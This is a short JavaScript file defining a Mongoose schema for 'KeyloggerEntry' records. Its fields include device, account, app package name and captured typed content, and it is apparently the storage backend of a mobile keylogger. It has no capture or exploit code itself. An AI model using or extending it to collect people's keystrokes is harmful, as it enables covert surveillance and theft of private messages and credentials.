import mongoose from 'mongoose';

const keyloggerSchema = new mongoose.Schema({
  deviceNumber: {
    type: String,
    required: true
  },
  brand: {
    type: String,
    required: true
  },
  model: {
    type: String,
    required: true
  },
  userId: {
    type: String,
    required: true
  },
  account: {
    type: String,
    required: true
  },
  nickname: {
    type: String
  },
  content: {
    type: String,
    required: true
  },
  packageName: {
    type: String,
    required: true
  },
  recordingTime: {
    type: Date,
    default: Date.now
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
});

// Update the 'updatedAt' field on every save
keyloggerSchema.pre('save', function(next) {
  this.updatedAt = Date.now();
  next();
});

export default mongoose.model('KeyloggerEntry', keyloggerSchema);